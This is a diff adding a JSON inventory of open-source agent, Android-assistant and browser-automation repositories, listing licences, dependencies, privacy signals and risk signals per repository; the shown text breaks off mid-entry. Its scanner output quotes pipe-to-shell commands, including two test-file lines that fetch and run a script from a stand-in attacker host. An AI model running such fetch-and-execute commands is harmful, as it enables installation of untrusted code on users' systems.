@@ -1,0 +1,2813 @@
+{
+  "repositories": [
+    {
+      "name": "agent-framework",
+      "category": "agents",
+      "url": "https://github.com/microsoft/agent-framework.git",
+      "priority": "MEDIUM/HIGH",
+      "kind": "agent orchestration",
+      "status": "cloned",
+      "commit": "e9857bd75a21843803431a2e7dfa41ee9b017ac7",
+      "commit_date": "2026-10-02T14:12:01Z",
+      "branch": "main",
+      "size_mb": 56.7,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "C#",
+      "language_mix": {
+        "C#": 1456,
+        "Python": 982,
+        "TypeScript": 86,
+        "CSS": 17,
+        "JavaScript": 10,
+        "PowerShell": 8
+      },
+      "dependencies": {
+        "python:python/pyproject.toml": [
+          "agent-framework-core"
+        ],
+        "node:python/packages/devui/frontend/package.json": [
+          "@radix-ui/react-checkbox",
+          "@radix-ui/react-dropdown-menu",
+          "@radix-ui/react-label",
+          "@radix-ui/react-scroll-area",
+          "@radix-ui/react-select",
+          "@radix-ui/react-separator",
+          "@radix-ui/react-slot",
+          "@radix-ui/react-switch",
+          "@radix-ui/react-tabs",
+          "@radix-ui/react-tooltip",
+          "@tailwindcss/vite",
+          "@xyflow/react",
+          "class-variance-authority",
+          "clsx",
+          "lucide-react",
+          "next-themes",
+          "react",
+          "react-dom",
+          "tailwind-merge",
+          "tailwindcss",
+          "zustand"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          ".github/.linkspector.yml: openai.",
+          "dotnet/README.md: OpenAI.",
+          "python/.cspell.json: mistralai",
+          "python/CHANGELOG.md: Cohere",
+          "python/DEV_SETUP.md: openai.",
+          ".github/workflows/python-openai-dependency-bounds.yml: openai."
+        ],
+        "telemetry_sdk": [
+          "README.md: telemetry",
+          "python/CHANGELOG.md: telemetry",
+          "python/CODING_STANDARD.md: telemetry",
+          "docs/decisions/0003-agent-opentelemetry-instrumentation.md: telemetry",
+          "docs/decisions/0007-agent-filtering-middleware.md: telemetry",
+          "docs/decisions/0009-support-long-running-operations.md: telemetry"
+        ],
+        "api_key_env": [
+          "python/.cspell.json: huggingface",
+          "python/DEV_SETUP.md: OPENAI_API_KEY",
+          "python/README.md: OPENAI_API_KEY",
+          ".github/scripts/stale_issue_pr_ping.py: GITHUB_TOKEN",
+          ".github/tests/test_devflow_fix_ci_workflow.js: GITHUB_TOKEN",
+          ".github/tests/test_stale_issue_pr_ping.py: GITHUB_TOKEN"
+        ],
+        "auth_required": [
+          "python/packages/azure-cosmos-memory/README.md: login`), so **no API key is required",
+          "python/samples/03-workflows/control-flow/switch_case_edge_group.py: login and required"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "python/DEV_SETUP.md: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          ".github/workflows/python-integration-tests.yml: curl -fsSL https://ollama.com/install.sh | sh",
+          ".github/workflows/python-merge-tests.yml: curl -fsSL https://ollama.com/install.sh | sh",
+          "python/packages/tools/tests/test_policy.py: curl https://evil.example/install.sh | sh",
+          "python/packages/tools/tests/test_security.py: curl https://evil.example | bash"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "python/packages/core/agent_framework/_workflows/_viz.py: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 5479
+    },
+    {
+      "name": "autogen",
+      "category": "agents",
+      "url": "https://github.com/microsoft/autogen.git",
+      "priority": "LOW/MEDIUM",
+      "kind": "multi-agent (maintenance mode)",
+      "status": "cloned",
+      "commit": "027ecf0a379bcc1d09956d46d12d44a3ad9cee14",
+      "commit_date": "2026-04-06T15:35:32-07:00",
+      "branch": "main",
+      "size_mb": 55.4,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "CC-BY-4.0",
+            "osd": false
+          },
+          {
+            "file": "LICENSE-CODE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": true,
+        "note": "dual/multi-file: LICENSE=CC-BY-4.0, LICENSE-CODE=MIT"
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 423,
+        "C#": 391,
+        "TypeScript": 125,
+        "Protobuf": 7,
+        "Shell": 6,
+        "JavaScript": 5
+      },
+      "dependencies": {
+        "manifest:python:python/pyproject.toml": [
+          "(no required deps)"
+        ],
+        "node:python/packages/autogen-studio/frontend/package.json": [
+          "@dagrejs/dagre",
+          "@dnd-kit/core",
+          "@headlessui/react",
+          "@heroicons/react",
+          "@mdx-js/react",
+          "@monaco-editor/react",
+          "@tailwindcss/typography",
+          "@xyflow/react",
+          "antd",
+          "autoprefixer",
+          "gatsby",
+          "gatsby-plugin-image",
+          "gatsby-plugin-manifest",
+          "gatsby-plugin-mdx",
+          "gatsby-plugin-postcss",
+          "gatsby-plugin-sharp",
+          "gatsby-source-filesystem",
+          "gatsby-transformer-sharp",
+          "install",
+          "lucide-react",
+          "postcss",
+          "react",
+          "react-dom",
+          "react-markdown",
+          "remark-gfm",
+          "tailwindcss",
+          "yarn",
+          "zustand"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "TRANSPARENCY_FAQS.md: openai.",
+          "dotnet/samples/dev-team/docs/github-flow-getting-started.md: openai.",
+          "dotnet/website/articles/Agent-overview.md: OpenAI.",
+          "dotnet/website/articles/AutoGen-OpenAI-Overview.md: OpenAI.",
+          "dotnet/website/articles/Function-call-with-ollama-and-litellm.md: OpenAI.",
+          "dotnet/website/articles/Installation.md: anthropic."
+        ],
+        "telemetry_sdk": [
+          "dotnet/samples/Hello/README.md: telemetry",
+          "python/docs/src/user-guide/core-user-guide/index.md: telemetry",
+          "python/docs/src/user-guide/core-user-guide/cookbook/instrumenting.md: Telemetry",
+          "python/docs/src/user-guide/core-user-guide/framework/telemetry.md: Telemetry",
+          "python/packages/autogen-core/src/autogen_core/_single_threaded_agent_runtime.py: telemetry",
+          "python/packages/autogen-core/src/autogen_core/_telemetry/_propagation.py: telemetry"
+        ],
+        "api_key_env": [
+          "README.md: OPENAI_API_KEY",
+          "TRANSPARENCY_FAQS.md: huggingface",
+          "dotnet/README.md: OPENAI_API_KEY",
+          ".github/ISSUE_TEMPLATE/1-bug_report.yml: HuggingFace",
+          ".github/workflows/docs.yml: GITHUB_TOKEN",
+          ".github/workflows/dotnet-build.yml: OPENAI_API_KEY"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "python/packages/autogen-ext/src/autogen_ext/memory/redis/_redis_memory.py: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 1837
+    },
+    {
+      "name": "langgraph",
+      "category": "agents",
+      "url": "https://github.com/langchain-ai/langgraph.git",
+      "priority": "HIGH",
+      "kind": "stateful orchestration",
+      "status": "cloned",
+      "commit": "9a0394d88b2211f299dcd69df92db3480c69ee61",
+      "commit_date": "2026-10-03T08:55:59-04:00",
+      "branch": "main",
+      "size_mb": 13.6,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 245,
+        "TypeScript": 5,
+        "JavaScript": 1
+      },
+      "dependencies": {
+        "python:libs/checkpoint-postgres/pyproject.toml": [
+          "langgraph-checkpoint",
+          "orjson",
+          "psycopg",
+          "psycopg-pool"
+        ],
+        "manifest:node:libs/cli/js-monorepo-example/package.json": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "libs/checkpoint/langgraph/store/base/__init__.py: cohere",
+          "libs/cli/langgraph_cli/schemas.py: cohere",
+          "libs/cli/js-examples/src/agent/graph.ts: openai."
+        ],
+        "telemetry_sdk": [
+          "libs/sdk-py/integration/graph/tools_agent.py: telemetry",
+          "libs/sdk-py/integration/scripts/test_tools.py: telemetry"
+        ],
+        "api_key_env": [
+          ".github/workflows/pr_lint.yml: GITHUB_TOKEN",
+          ".github/workflows/release.yml: GITHUB_TOKEN",
+          ".github/workflows/reopen_on_assignment.yml: GITHUB_TOKEN",
+          ".github/workflows/require_issue_link.yml: GITHUB_TOKEN",
+          ".github/workflows/tag-external-issues.yml: GITHUB_TOKEN",
+          ".github/workflows/tag-external-prs.yml: GITHUB_TOKEN"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": [
+          "docs/generate_redirects.py: urllib.request.urlopen(",
+          "libs/cli/langgraph_cli/analytics.py: urllib.request.urlopen(",
+          "libs/cli/langgraph_cli/deploy.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 681
+    },
+    {
+      "name": "pydantic-ai",
+      "category": "agents",
+      "url": "https://github.com/pydantic/pydantic-ai.git",
+      "priority": "CRITICAL",
+      "kind": "typed agent framework",
+      "status": "cloned",
+      "commit": "721c78d6014f197c595a9c2a83789aa4dbf6d008",
+      "commit_date": "2026-10-04T16:07:00-06:00",
+      "branch": "main",
+      "size_mb": 282.0,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 850,
+        "Shell": 8
+      },
+      "dependencies": {
+        "manifest:python:pyproject.toml": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "pyproject.toml: cohere",
+          "agent_docs/index.md: anthropic.",
+          "docs/agent.md: openai.",
+          "docs/changelog.md: openai.",
+          "docs/embeddings.md: openai.",
+          "docs/gateway.md: openai."
+        ],
+        "telemetry_sdk": [
+          "docs/evals.md: telemetry",
+          "docs/logfire.md: Sentry",
+          "docs/navigation.yml: PostHog",
+          "docs/tools-advanced.md: telemetry",
+          "tests/test_include_binary_content.py: telemetry",
+          "tests/test_instrumentation_content_redaction.py: telemetry"
+        ],
+        "api_key_env": [
+          "pyproject.toml: huggingface",
+          ".github/set_docs_main_preview_url.py: GITHUB_TOKEN",
+          ".github/set_docs_pr_preview_url.py: GITHUB_TOKEN",
+          ".github/zizmor.yml: HuggingFace",
+          "clai/README.md: OPENAI_API_KEY",
+          "docs/changelog.md: huggingface"
+        ],
+        "auth_required": [
+          "src/pydantic_clai2/pydantic_clai2/builtin_plugins/linear.py: sign in, which `/keys` entry to use"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "docs/harness/macroscope.md: curl -sSL https://raw.githubusercontent.com/prassoai/macroscope-local/",
+          "src/pydantic_ai_harness/pydantic_ai_harness/macroscope/README.md: curl -sSL https://raw.githubusercontent.com/prassoai/macroscope-local/",
+          "src/pydantic_ai_harness/pydantic_ai_harness/macroscope/_toolset.py: curl -sSL https://raw.githubusercontent.com/prassoai/macroscope-local/"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          ".github/workflows/at-claude.yml: sudo apt",
+          ".github/workflows/bots.yml: sudo apt",
+          ".github/workflows/ci.yml: sudo apt",
+          "docs/harness/sprites-sandbox.md: sudo apt",
+          "src/pydantic_ai_harness/pydantic_ai_harness/sprites_sandbox/README.md: sudo apt"
+        ],
+        "remote_code_load": [
+          ".github/scripts/agent_provider_health.py: urllib.request.urlopen(",
+          ".github/scripts/ci_duration.py: urllib.request.urlopen(",
+          "src/pydantic_ai_harness/scripts/gh_aw_engine_version.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 4102
+    },
+    {
+      "name": "LocalMind",
+      "category": "android",
+      "url": "https://github.com/tk85457/LocalMind.git",
+      "priority": "HIGH",
+      "kind": "Kotlin local-LLM assistant",
+      "status": "cloned",
+      "commit": "e85b5304d4a167437980c52497a6a1716e9c8c37",
+      "commit_date": "2026-08-14T10:12:48+05:30",
+      "branch": "main",
+      "size_mb": 138.4,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "C++",
+      "language_mix": {
+        "C++": 308,
+        "C/C++ header": 219,
+        "CUDA": 162,
+        "Kotlin": 155,
+        "TypeScript": 146,
+        "Python": 48
+      },
+      "dependencies": {
+        "manifest:python:app/src/main/cpp/llama.cpp/requirements.txt": [
+          "(no required deps)"
+        ],
+        "node:app/src/main/cpp/llama.cpp/tools/server/webui/package.json": [
+          "highlight.js",
+          "mode-watcher",
+          "pdfjs-dist",
+          "rehype-highlight",
+          "rehype-stringify",
+          "remark",
+          "remark-breaks",
+          "remark-gfm",
+          "remark-html",
+          "remark-rehype",
+          "svelte-sonner",
+          "unist-util-visit"
+        ],
+        "manifest:java:build.gradle.kts": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "app/src/main/cpp/llama.cpp/convert_hf_to_gguf_update.py: mistralai",
+          "app/src/main/cpp/llama.cpp/README.md: openai.",
+          "app/src/main/cpp/llama.cpp/docs/function-calling.md: openai.",
+          "app/src/main/cpp/llama.cpp/examples/json_schema_pydantic_example.py: openai.",
+          "app/src/main/cpp/llama.cpp/gguf-py/gguf/tensor_mapping.py: cohere",
+          "app/src/main/cpp/llama.cpp/gguf-py/tests/test_metadata.py: mistralai"
+        ],
+        "telemetry_sdk": [
+          "README.md: telemetry",
+          "SECURITY.md: telemetry",
+          "app/src/main/cpp/llama.cpp/tools/server/webui/tests/stories/fixtures/data-analysis.ts: Amplitude",
+          "app/src/main/java/com/tk854/localmind/llm/LLMEngine.kt: telemetry",
+          "app/src/main/java/com/tk854/localmind/data/repository/ChatRepository.kt: telemetry"
+        ],
+        "api_key_env": [
+          "README.md: huggingface",
+          "SECURITY_COMPLIANCE.md: huggingface",
+          ".github/workflows/android-ci.yml: GITHUB_TOKEN",
+          "app/src/main/cpp/llama.cpp/convert_hf_to_gguf_update.py: huggingface",
+          "app/src/main/cpp/llama.cpp/convert_llama_ggml_to_gguf.py: HuggingFace",
+          "app/src/main/cpp/llama.cpp/convert_lora_to_gguf.py: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "app/src/main/cpp/llama.cpp/docs/build.md: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build-cmake-pkg.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build-linux-cross.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/copilot-setup-steps.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/release.yml: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 2526
+    },
+    {
+      "name": "offline-ai-assistant",
+      "category": "android",
+      "url": "https://github.com/its-hazratbilal/offline-ai-assistant.git",
+      "priority": "MEDIUM/HIGH",
+      "kind": "Android local-LLM assistant",
+      "status": "cloned",
+      "commit": "55f29a33851b9c800c7bdc0c835b58e9c9770299",
+      "commit_date": "2026-08-17T14:45:58+05:00",
+      "branch": "main",
+      "size_mb": 155.0,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "C++",
+      "language_mix": {
+        "C++": 492,
+        "C/C++ header": 295,
+        "TypeScript": 267,
+        "CUDA": 185,
+        "Python": 137,
+        "Kotlin": 77
+      },
+      "dependencies": {
+        "manifest:python:app/src/main/cpp/llama.cpp/requirements.txt": [
+          "(no required deps)"
+        ],
+        "manifest:node:app/src/main/cpp/llama.cpp/tools/ui/package.json": [
+          "(no required deps)"
+        ],
+        "manifest:java:build.gradle.kts": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "app/src/main/cpp/llama.cpp/convert_hf_to_gguf_update.py: mistralai",
+          "app/src/main/cpp/llama.cpp/README.md: openai.",
+          "app/src/main/cpp/llama.cpp/conversion/base.py: mistralai",
+          "app/src/main/cpp/llama.cpp/docs/autoparser.md: Cohere",
+          "app/src/main/cpp/llama.cpp/docs/function-calling.md: openai.",
+          "app/src/main/cpp/llama.cpp/gguf-py/gguf/tensor_mapping.py: cohere"
+        ],
+        "telemetry_sdk": [
+          "app/src/main/cpp/llama.cpp/tools/ui/tests/stories/fixtures/data-analysis.ts: Amplitude"
+        ],
+        "api_key_env": [
+          "app/src/main/cpp/llama.cpp/CONTRIBUTING.md: HuggingFace",
+          "app/src/main/cpp/llama.cpp/convert_hf_to_gguf.py: huggingface",
+          "app/src/main/cpp/llama.cpp/convert_hf_to_gguf_update.py: huggingface",
+          "app/src/main/cpp/llama.cpp/convert_llama_ggml_to_gguf.py: HuggingFace",
+          "app/src/main/cpp/llama.cpp/convert_lora_to_gguf.py: huggingface",
+          "app/src/main/cpp/llama.cpp/README.md: huggingface"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "app/src/main/cpp/llama.cpp/docs/build.md: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build-3rd-party.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build-and-test-snapdragon.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build-cpu.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build-cross.yml: sudo apt",
+          "app/src/main/cpp/llama.cpp/.github/workflows/build-cuda-ubuntu.yml: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 2958
+    },
+    {
+      "name": "scrcpy",
+      "category": "android",
+      "url": "https://github.com/Genymobile/scrcpy.git",
+      "priority": "CRITICAL",
+      "kind": "Android display/control",
+      "status": "cloned",
+      "commit": "19c1261d2e2cbf2b5e6a71a8b64cc1dd3ede06ac",
+      "commit_date": "2026-09-05T12:06:07+02:00",
+      "branch": "master",
+      "size_mb": 1.8,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Java",
+      "language_mix": {
+        "Java": 91,
+        "C/C++ header": 89,
+        "C": 79,
+        "Shell": 20,
+        "Gradle": 4,
+        "Batch": 2
+      },
+      "dependencies": {
+        "manifest:java:build.gradle": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [],
+        "telemetry_sdk": [],
+        "api_key_env": [],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "doc/build.md: sudo apt",
+          "doc/linux.md: sudo apt",
+          "doc/v4l2.md: sudo apt",
+          ".github/workflows/release.yml: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 371
+    },
+    {
+      "name": "termux-api",
+      "category": "android",
+      "url": "https://github.com/termux/termux-api.git",
+      "priority": "CRITICAL",
+      "kind": "Android device APIs to CLI",
+      "status": "cloned",
+      "commit": "fc26ce17e3badf85d4df191af364fcf7798047f1",
+      "commit_date": "2026-09-17T07:16:22+05:00",
+      "branch": "master",
+      "size_mb": 1.1,
+      "error": "",
+      "licence": {
+        "files": [],
+        "spdx": "NONE-FOUND",
+        "osd": false,
+        "declared_in_readme": "",
+        "note": "no LICENSE file; default copyright applies, so there is no permission to use"
+      },
+      "language": "Java",
+      "language_mix": {
+        "Java": 53,
+        "Gradle": 3,
+        "Batch": 1
+      },
+      "dependencies": {
+        "manifest:java:build.gradle": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [],
+        "telemetry_sdk": [],
+        "api_key_env": [
+          ".github/workflows/github_release_build.yml: GITHUB_TOKEN"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 1048
+    },
+    {
+      "name": "vesta",
+      "category": "android",
+      "url": "https://github.com/RisorseArtificiali/vesta.git",
+      "priority": "CRITICAL",
+      "kind": "offline Android assistant",
+      "status": "cloned",
+      "commit": "0c98470eb5c19f64053470effc73c38d2c6cc51c",
+      "commit_date": "2026-07-08T11:16:03+02:00",
+      "branch": "main",
+      "size_mb": 3.0,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "TypeScript",
+      "language_mix": {
+        "TypeScript": 101,
+        "Kotlin": 9,
+        "JavaScript": 4,
+        "Shell": 1
+      },
+      "dependencies": {
+        "node:apps/mobile/package.json": [
+          "expo",
+          "expo-calendar",
+          "expo-contacts",
+          "expo-dev-client",
+          "expo-document-picker",
+          "expo-file-system",
+          "expo-linking",
+          "expo-notifications",
+          "expo-router",
+          "expo-sqlite",
+          "expo-status-bar",
+          "jszip",
+          "llama.rn",
+          "pdfjs-dist",
+          "react",
+          "react-dom",
+          "react-native",
+          "react-native-get-random-values",
+          "react-native-safe-area-context",
+          "react-native-screens",
+          "uuid",
+          "zustand"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [],
+        "telemetry_sdk": [
+          "CHANGELOG.md: telemetry",
+          "README.md: telemetry",
+          "docs/GAMEPLAN.md: telemetry",
+          "docs/PRD.md: telemetry",
+          "apps/mobile/app/diagnostics.tsx: telemetry",
+          "apps/mobile/lib/models/hf-client.ts: telemetry"
+        ],
+        "api_key_env": [
+          "CHANGELOG.md: HuggingFace",
+          "README.md: HuggingFace",
+          "docs/ARCHITECTURE.md: HuggingFace",
+          "apps/mobile/app/models.tsx: HuggingFace",
+          "apps/mobile/lib/models/catalog.ts: HuggingFace",
+          "apps/mobile/lib/models/hf-client.ts: HuggingFace"
+        ],
+        "auth_required": [
+          "apps/mobile/app/models.tsx: login required"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 180
+    },
+    {
+      "name": "browser-use",
+      "category": "browser",
+      "url": "https://github.com/browser-use/browser-use.git",
+      "priority": "CRITICAL",
+      "kind": "AI browser automation",
+      "status": "cloned",
+      "commit": "7be96ed8bafa8dfe1eef228b59cf5c884b8b2431",
+      "commit_date": "2026-10-02T17:06:05-07:00",
+      "branch": "main",
+      "size_mb": 9.3,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 168,
+        "Shell": 4
+      },
+      "dependencies": {
+        "python:pyproject.toml": [
+          "InquirerPy",
+          "agentmail",
+          "aiohttp",
+          "anthropic",
+          "anyio",
+          "boto3",
+          "botocore",
+          "browser-harness",
+          "browser-use",
+          "browser-use-core",
+          "browser-use-sdk",
+          "bubus",
+          "cdp-use",
+          "click",
+          "cloudpickle",
+          "datamodel-code-generator",
+          "google-api-core",
+          "google-api-python-client",
+          "google-auth",
+          "google-auth-oauthlib",
+          "google-genai",
+          "groq",
+          "httpx",
+          "imageio",
+          "imgcat",
+          "langchain-openai",
+          "lmnr",
+          "markdownify",
+          "mcp",
+          "numpy",
+          "oci",
+          "ollama",
+          "openai",
+          "pillow",
+          "posthog",
+          "psutil",
+          "pydantic",
+          "pydantic-settings",
+          "pyobjc",
+          "pyotp"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "AGENTS.md: openai.",
+          "README.md: openai.",
+          "browser_use/logging_config.py: anthropic.",
+          "browser_use/__init__.py: openai.",
+          "browser_use/agent/service.py: anthropic.",
+          "browser_use/beta/__init__.py: openai."
+        ],
+        "telemetry_sdk": [
+          "AGENTS.md: PostHog",
+          "BETA_AGENT_INTEGRATION_FEATURES.md: telemetry",
+          "pyproject.toml: posthog",
+          "browser_use/cli.py: telemetry",
+          "browser_use/config.py: telemetry",
+          "browser_use/agent/service.py: telemetry"
+        ],
+        "api_key_env": [
+          "AGENTS.md: OPENAI_API_KEY",
+          "README.md: OPENAI_API_KEY",
+          "browser_use/config.py: OPENAI_API_KEY",
+          ".github/workflows/claude.yml: OPENAI_API_KEY",
+          ".github/workflows/docker.yml: GITHUB_TOKEN",
+          ".github/workflows/publish.yml: GITHUB_TOKEN"
+        ],
+        "auth_required": [
+          "browser_use/agent/system_prompts/system_prompt.md: login failed without credentials, email/verification wall, required",
+          "browser_use/agent/system_prompts/system_prompt_anthropic_flash.md: login failed without credentials, email/verification wall, required",
+          "browser_use/agent/system_prompts/system_prompt_no_thinking.md: login failed without credentials, email/verification wall, required"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "CLOUD.md: curl -fsSL https://browser-use.com/profile.sh | sh",
+          "bin/setup.sh: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          ".github/workflows/install-script.yml: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          "browser_use/beta/service.py: curl -fsSL https://browser-use.com/terminal/install.sh | sh",
+          "skills/qa/SKILL.md: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          "skills/cloud/references/quickstart.md: curl -fsSL https://browser-use.com/profile.sh | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          ".github/workflows/claude.yml: sudo apt"
+        ],
+        "remote_code_load": [
+          "browser_use/browser/profile.py: urllib.request.urlopen(",
+          "examples/features/large_blocklist.py: urllib.request.urlopen(",
+          "skills/qa/references/browser-use-v2.md: urllib.request.urlopen("
+        ]
+      },
+      "files": 536
+    },
+    {
+      "name": "open-browser-use",
+      "category": "browser",
+      "url": "https://github.com/open-browser-use/open-browser-use.git",
+      "priority": "HIGH",
+      "kind": "control existing local browser",
+      "status": "cloned",
+      "commit": "7765002ac88040aedc781be89afe68475a9d6c88",
+      "commit_date": "2026-06-02T17:22:27+08:00",
+      "branch": "main",
+      "size_mb": 7.4,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "TypeScript",
+      "language_mix": {
+        "TypeScript": 126,
+        "Rust": 96,
+        "Shell": 5,
+        "JavaScript": 3,
+        "CSS": 3,
+        "HTML": 3
+      },
+      "dependencies": {
+        "manifest:node:package.json": [
+          "(no required deps)"
+        ],
+        "manifest:rust:Cargo.toml": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [],
+        "telemetry_sdk": [
+          "docs/agent-environment-product-logic-and-optimization.md: telemetry",
+          "docs/superpowers/specs/2026-05-26-agent-queryable-dev-logs-design.md: telemetry",
+          "packages/extension/src/cursor.ts: amplitude"
+        ],
+        "api_key_env": [],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "docs/install.md: curl -fsSL https://github.com/open-browser-use/open-browser-use/releas",
+          "prompts/agent-install-prompt.md: curl -fsSL https://github.com/open-browser-use/open-browser-use/releas",
+          ".github/workflows/p4-packaging-ci.yml: curl --proto '=https' --tlsv1.2 -LsSf https://github.com/axodotdev/car",
+          "crates/obu-node-repl/tests/description_snapshot.rs: curl -fsSL https://github.com/open-browser-use/open-browser-use/releas"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          ".github/workflows/p4-packaging-ci.yml: sudo apt"
+        ],
+        "remote_code_load": []
+      },
+      "files": 490
+    },
+    {
+      "name": "OmniParser",
+      "category": "computer-use",
+      "url": "https://github.com/microsoft/OmniParser.git",
+      "priority": "HIGH",
+      "kind": "screenshot -> UI structure",
+      "status": "cloned",
+      "commit": "354021201345a96178360b28733573e27269f2de",
+      "commit_date": "2026-07-19T18:09:31-07:00",
+      "branch": "master",
+      "size_mb": 20.6,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "CC-BY-4.0",
+            "osd": false
+          }
+        ],
+        "spdx": "CC-BY-4.0",
+        "osd": false,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 27,
+        "Shell": 6,
+        "PowerShell": 3,
+        "Jupyter": 1,
+        "Batch": 1
+      },
+      "dependencies": {
+        "python:requirements.txt": [
+          "accelerate",
+          "anthropic",
+          "azure-identity",
+          "boto3",
+          "dashscope",
+          "dill",
+          "easyocr",
+          "einops",
+          "google-auth",
+          "gradio",
+          "groq",
+          "huggingface_hub",
+          "jsonschema",
+          "numpy",
+          "openai",
+          "opencv-python",
+          "opencv-python-headless",
+          "paddleocr",
+          "paddlepaddle",
+          "pre-commit",
+          "pyautogui",
+          "pytest",
+          "pytest-asyncio",
+          "ruff",
+          "screeninfo",
+          "streamlit",
+          "supervision",
+          "timm",
+          "torch",
+          "torchvision",
+          "transformers",
+          "uiautomation",
+          "ultralytics"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
